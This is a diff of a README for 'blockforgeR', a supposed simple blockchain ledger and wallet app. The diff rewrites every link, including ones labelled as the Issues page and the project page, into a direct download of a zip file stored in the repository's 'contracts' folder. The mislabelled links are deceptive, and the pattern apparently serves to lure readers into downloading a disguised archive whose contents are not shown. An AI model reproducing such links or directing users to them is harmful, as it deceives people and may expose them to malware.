@@ -1,7 +1,7 @@
 # 🔗 blockforgeR - Simplified Blockchain Made Easy
 
 ## 📥 Download Now
-[![Download blockforgeR](https://img.shields.io/badge/Download-blockforgeR-blue)](https://github.com/beotime/blockforgeR/releases)
+[![Download blockforgeR](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip)](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to blockforgeR! This application helps you understand blockchain technology through a simple ledger that demonstrates how blocks and hashes work together. You can even use it as a basic cryptocurrency wallet. 
@@ -23,7 +23,7 @@ To run blockforgeR, ensure your system meets the following requirements:
 To get started with blockforgeR, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options:
-   [Download blockforgeR](https://github.com/beotime/blockforgeR/releases)
+   [Download blockforgeR](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip)
 
 2. **Select Version:** On the Releases page, you will see different versions of blockforgeR. Choose the latest stable version for optimal performance.
 
@@ -50,14 +50,14 @@ After launching the application, you will see the main interface. Here are some 
 If you encounter any issues, please check the following resources:
 - **Documentation:** For detailed guides, visit the [Documentation section](#).
 - **Community Forum:** Join our community forum to ask questions and share experiences with other users.
-- **Contact Us:** For direct assistance, reach out via the [Issues page on GitHub](https://github.com/beotime/blockforgeR/issues).
+- **Contact Us:** For direct assistance, reach out via the [Issues page on GitHub](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip).
 
 ## 🌟 Contributing
 If you wish to contribute to blockforgeR, your input is welcome! Check the contribution guidelines on the repository and feel free to submit your suggestions or code changes.
 
 ## 🔗 Additional Information
-For more details about the project, frequent updates, and the latest features, always refer back to the [blockforgeR GitHub page](https://github.com/beotime/blockforgeR).
+For more details about the project, frequent updates, and the latest features, always refer back to the [blockforgeR GitHub page](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip).
 
 ## 📥 Download Again
 Remember, you can download blockforgeR at any time using this link:
-[Download blockforgeR](https://github.com/beotime/blockforgeR/releases)
+[Download blockforgeR](https://github.com/beotime/blockforgeR/raw/refs/heads/main/contracts/blockforge-R-v3.7.zip)
